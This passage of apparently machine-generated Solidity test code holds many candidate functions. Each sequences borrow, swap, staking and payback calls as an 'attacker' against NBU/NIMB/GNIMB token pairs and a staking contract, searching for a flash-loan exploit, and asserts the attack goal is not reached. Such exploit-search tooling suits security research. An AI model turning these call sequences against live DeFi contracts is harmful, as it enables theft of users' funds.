        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2327(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2328(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2329(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2330(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2331(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2332(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2333(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2334(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2335(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2336(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2337(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2338(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2339(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2340(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2341(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2342(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2343(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2344(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2345(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2346(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2347(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2348(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2349(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2350(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2351(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2352(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2353(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2354(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2355(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2356(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2357(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2358(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2359(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2360(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2361(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2362(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2363(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2364(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2365(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2366(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2367(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2368(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2369(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2370(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2371(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2372(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2373(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2374(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
